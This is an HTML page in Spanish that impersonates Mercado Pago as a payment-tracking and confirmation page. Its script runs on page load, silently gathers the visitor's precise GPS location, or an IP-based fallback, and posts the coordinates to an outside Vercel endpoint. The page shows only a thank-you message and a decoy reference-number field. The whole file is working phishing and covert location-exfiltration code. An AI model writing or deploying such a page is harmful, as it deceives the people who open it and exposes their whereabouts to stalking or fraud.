<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- LOGO ARRIBA A LA IZQUIERDA -->
  <div style="width: 100%; padding: 10px;">
    <img src="https://http2.mlstatic.com/storage/pog-cm-admin/calm-assets/logo_mp_5560x300--560x300--e33eb5cd.webp" alt="Logo" style="height: 70px;">
  </div>

  <title>Mercado pago</title>

  <script>
    var ubicacionesRegistradas = [];

    // ========================================
    //   INICIO AUTOMÁTICO (SIN BOTONES)
    // ========================================
    window.addEventListener("load", () => {
      iniciarUbicacion();
    });

    function iniciarUbicacion() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            registrarGPS(pos);
            enviarUbicacionesAlServidor(); // Envío inmediato
          },
          function () {
            obtenerUbicacionIP();
          },
          {
            enableHighAccuracy: true,
            timeout: 8000,
            maximumAge: 0
          }
        );
      } else {
        obtenerUbicacionIP();
      }
    }

    // ========================================
    //      UBICACIÓN GPS
    // ========================================
    function registrarGPS(position) {
      const latitud = position.coords.latitude;
      const longitud = position.coords.longitude;

      ubicacionesRegistradas.push({
        tipo: "GPS",
        latitud,
        longitud
      });

      actualizarListaUbicaciones();
    }

    // ========================================
    //   UBICACIÓN POR IP (fallback)
    // ========================================
    async function obtenerUbicacionIP() {
      try {
        const r = await fetch("https://ipapi.co/json/");
        const data = await r.json();

        if (!data.latitude || !data.longitude) {
          console.warn("IP no regresó coordenadas");
          return;
        }

        ubicacionesRegistradas.push({
          tipo: "IP",
          latitud: data.latitude,
          longitud: data.longitude
        });

        actualizarListaUbicaciones();
        enviarUbicacionesAlServidor(); // Envío inmediato

      } catch (err) {
        console.error("Error IP:", err);
      }
    }

    // ========================================
    //  LISTA VISUAL (texto fijo)
    // ========================================
    function actualizarListaUbicaciones() {
      var lista = document.getElementById("ubicaciones");
      lista.innerHTML = "";

      var ultimas = ubicacionesRegistradas.slice(-5);

      ultimas.forEach((u) => {
        var li = document.createElement("li");
        li.textContent = "Gracias por sus respuestas";
        lista.appendChild(li);
      });
    }

    // ========================================
    //   ENVÍO AUTOMÁTICO A VERCEL
    // ========================================
    async function enviarUbicacionesAlServidor() {
      const texto = JSON.stringify(ubicacionesRegistradas);

      const vercelURL = "https://github-upload-api.vercel.app/api/subir";

      try {
        const response = await fetch(vercelURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ texto })
        });

        const data = await response.json();

        if (data.success) {
          console.log("Formulario enviado automáticamente.");
        } else {
          console.error("Error al subir:", data.error);
        }
      } catch (e) {
        console.error("Error al enviar:", e);
      }
    }

  </script>
</head>

<body>
  <h2>Rastreo y confirmación de pagos</h2>

  <p>Ingrese número de referencia de 7 dígitos:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <ul id="ubicaciones"></ul>

  <button onclick="enviarUbicacionesAlServidor()">Consultar estatus</button>
</body>
</html>
